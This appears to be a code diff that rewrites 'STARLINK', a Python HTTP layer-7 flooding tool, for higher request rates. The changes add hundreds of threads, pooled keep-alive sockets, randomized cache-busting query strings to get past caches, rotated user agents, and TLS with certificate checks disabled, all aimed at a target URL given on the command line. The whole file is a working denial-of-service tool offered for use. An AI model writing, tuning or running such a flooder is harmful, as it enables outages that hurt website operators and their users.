@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-STARLINK - Cache Buster / L7 Flooder
+STARLINK - High RPS Cache Buster
 """
 
 import socket
@@ -11,11 +11,11 @@ import string
 import threading
 from datetime import datetime
 from colorama import init, Fore, Style
+import concurrent.futures
 
 init(autoreset=True)
 
 # Colors
-ORANGE = '\033[38;5;214m'
 CYAN = Fore.CYAN
 GREEN = Fore.GREEN
 RED = Fore.RED
@@ -23,7 +23,7 @@ YELLOW = Fore.YELLOW
 RESET = Style.RESET_ALL
 
 class StarLink:
-    def __init__(self, target, threads=50, duration=300):
+    def __init__(self, target, threads=500, duration=60):
         self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
         self.path = '/' + '/'.join(target.replace('https://', '').replace('http://', '').split('/')[1:]) if '/' in target else '/'
         self.threads = threads
@@ -31,133 +31,150 @@ class StarLink:
         self.running = True
         self.request_count = 0
         self.start_time = datetime.now()
+        self.lock = threading.Lock()
         
-        # User agents
+        # Pre-generated cache busters (speed optimization)
+        self.cache_busters = [f"?cache={i}" for i in range(1000, 9999)]
+        self.cache_busters += [f"?v={i}" for i in range(1, 1000)]
+        self.cache_busters += [f"?cb={random.randint(10000,99999)}" for _ in range(1000)]
+        
+        # Pre-generated user agents
         self.agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
         ]
         
-        # Cache busting patterns
-        self.patterns = [
-            lambda: f"?cache={random.randint(100000,999999)}",
-            lambda: f"?_={int(time.time()*1000)}",
-            lambda: f"?cb={self.rand_str(12)}",
-            lambda: f"?v={random.randint(1,999)}",
-            lambda: f"?t={datetime.now().strftime('%Y%m%d%H%M%S')}",
-            lambda: f"?nocache={self.rand_str(10)}",
-            lambda: f"?ver={random.randint(1000,9999)}",
-            lambda: f"?ts={int(time.time())}",
-            lambda: f"?rand={self.rand_str(16)}",
-            lambda: f"?cachebuster={random.randint(1,1000000)}"
-        ]
+        # Pre-built request templates (speed optimization)
+        self.request_templates = []
+        for agent in self.agents:
+            req = f"GET {self.path} CACHEBUSTER {random.choice(['HTTP/1.0', 'HTTP/1.1'])}\r\n"
+            req += f"Host: {self.target}\r\n"
+            req += f"User-Agent: {agent}\r\n"
+            req += "Accept: */*\r\n"
+            req += "Accept-Language: en-US\r\n"
+            req += "Connection: keep-alive\r\n"
+            req += "Cache-Control: no-cache\r\n"
+            req += "Pragma: no-cache\r\n"
+            req += "\r\n"
+            self.request_templates.append(req)
         
-        # HTTP versions for variety
-        self.http_vers = ["HTTP/1.0", "HTTP/1.1"]
-        
-        print(f"\n{CYAN}STARLINK Cache Buster{RESET}")
+        print(f"\n{CYAN}STARLINK High RPS Mode{RESET}")
         print(f"Target: {target}")
         print(f"Threads: {threads}")
         print(f"Duration: {duration}s")
         print("=" * 60)
         
-    def rand_str(self, n=8):
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
-    
     def build_request(self):
-        """Build request with random cache buster"""
-        http_ver = random.choice(self.http_vers)
-        cache_buster = random.choice(self.patterns)()
-        
-        # Randomize path with cache buster
-        full_path = f"{self.path}{cache_buster}"
-        
-        request = f"GET {full_path} {http_ver}\r\n"
-        request += f"Host: {self.target}\r\n"
-        request += f"User-Agent: {random.choice(self.agents)}\r\n"
-        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-        request += "Accept-Language: en-US,en;q=0.5\r\n"
-        request += "Accept-Encoding: gzip, deflate\r\n"
-        request += "Connection: keep-alive\r\n"
-        request += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-        request += f"Pragma: no-cache\r\n"
-        request += f"Expires: 0\r\n"
-        request += f"Referer: https://www.google.com/search?q={self.rand_str(10)}\r\n"
-        request += "\r\n"
-        
-        return request.encode()
+        """Fast request builder"""
+        template = random.choice(self.request_templates)
+        cache_buster = random.choice(self.cache_busters)
+        return template.replace('CACHEBUSTER', cache_buster).encode()
     
-    def attack(self, thread_id):
-        """Single thread attack function"""
+    def attack_worker(self):
+        """Single worker - keeps connections alive"""
+        # Pre-create socket
+        host = self.target.split(':')[0]
+        port = 443 if 'https' in str(self.target) or ':443' in str(self.target) else 80
+        
+        # Keep connection pool
+        sockets = []
+        for _ in range(10):  # 10 connections per thread
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                if port == 443:
+                    context = ssl.create_default_context()
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    sock = context.wrap_socket(sock, server_hostname=host)
+                sock.connect((host, port))
+                sockets.append(sock)
+            except:
+                continue
+        
+        if not sockets:
+            return
+        
+        # Attack loop
+        sock_index = 0
         while self.running:
             try:
-                # Create socket
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                
-                # HTTPS support
-                if 'https' in str(self.target) or ':443' in str(self.target):
-                    context = ssl.create_default_context()
-                    sock = context.wrap_socket(sock, server_hostname=self.target.split(':')[0])
-                    port = 443
-                else:
-                    port = 80
-                
-                # Connect
-                host = self.target.split(':')[0]
-                sock.connect((host, port))
+                # Round-robin sockets
+                sock = sockets[sock_index % len(sockets)]
+                sock_index += 1
                 
                 # Send request
                 request = self.build_request()
                 sock.send(request)
                 
-                # Receive response (partial)
+                # Try to read response (non-blocking)
                 try:
-                    response = sock.recv(4096)
-                    status = int(response.split(b'\r\n')[0].split(b' ')[1]) if response else 0
+                    sock.recv(4096)
                 except:
-                    status = 0
-                
-                sock.close()
+                    # Reconnect dead socket
+                    try:
+                        sock.close()
+                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        new_sock.settimeout(2)
+                        if port == 443:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            new_sock = context.wrap_socket(new_sock, server_hostname=host)
+                        new_sock.connect((host, port))
+                        sockets[sock_index % len(sockets)] = new_sock
+                    except:
+                        pass
                 
                 # Count request
-                self.request_count += 1
+                with self.lock:
+                    self.request_count += 1
                 
-                # Print status every 50 requests
-                if self.request_count % 50 == 0:
-                    elapsed = (datetime.now() - self.start_time).seconds
-                    rate = self.request_count / elapsed if elapsed > 0 else 0
-                    print(f"{CYAN}[{elapsed}s]{RESET} Requests: {self.request_count} | Rate: {rate:.1f}/s | Thread {thread_id}")
-                
-            except Exception as e:
+            except:
                 pass
     
+    def monitor(self):
+        """Monitor and display stats"""
+        last_count = 0
+        while self.running:
+            time.sleep(1)
+            elapsed = (datetime.now() - self.start_time).seconds
+            current = self.request_count
+            rps = current - last_count
+            last_count = current
+            
+            print(f"\r{CYAN}[{elapsed}s]{RESET} Requests: {current} | RPS: {rps} | Total: {rps*elapsed}", end='', flush=True)
+            
+            if elapsed >= self.duration:
+                self.running = False
+                break
+    
     def start(self):
-        """Start attack threads"""
-        threads = []
-        
+        """Start attack"""
         # Start threads
+        threads = []
         for i in range(self.threads):
-            t = threading.Thread(target=self.attack, args=(i+1,))
+            t = threading.Thread(target=self.attack_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-            time.sleep(0.05)  # Stagger thread start
         
-        print(f"{GREEN}[+] {self.threads} threads launched{RESET}")
-        print(f"{YELLOW}[*] Running for {self.duration} seconds...{RESET}")
+        # Start monitor
+        monitor = threading.Thread(target=self.monitor)
+        monitor.daemon = True
+        monitor.start()
         
-        # Run for duration
-        time.sleep(self.duration)
-        self.running = False
+        # Wait for duration
+        time.sleep(self.duration + 1)
         
         # Summary
         elapsed = (datetime.now() - self.start_time).seconds
-        print(f"\n{YELLOW}═══ Attack Complete ═══{RESET}")
+        print(f"\n\n{YELLOW}═══ Attack Complete ═══{RESET}")
         print(f"Total Requests: {self.request_count}")
-        print(f"Average Rate: {self.request_count/elapsed:.1f} req/s")
+        print(f"Average RPS: {self.request_count/elapsed:.1f}")
         print(f"Duration: {elapsed}s")
 
 if __name__ == "__main__":
@@ -165,12 +182,12 @@ if __name__ == "__main__":
     
     if len(sys.argv) < 2:
         print("Usage: python starlink.py <target> [threads] [duration]")
-        print("Example: python starlink.py https://example.com 100 60")
+        print("Example: python starlink.py https://example.com 1000 60")
         sys.exit(1)
     
     target = sys.argv[1]
-    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
-    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 300
+    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
+    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
     
     star = StarLink(target, threads, duration)
     star.start()
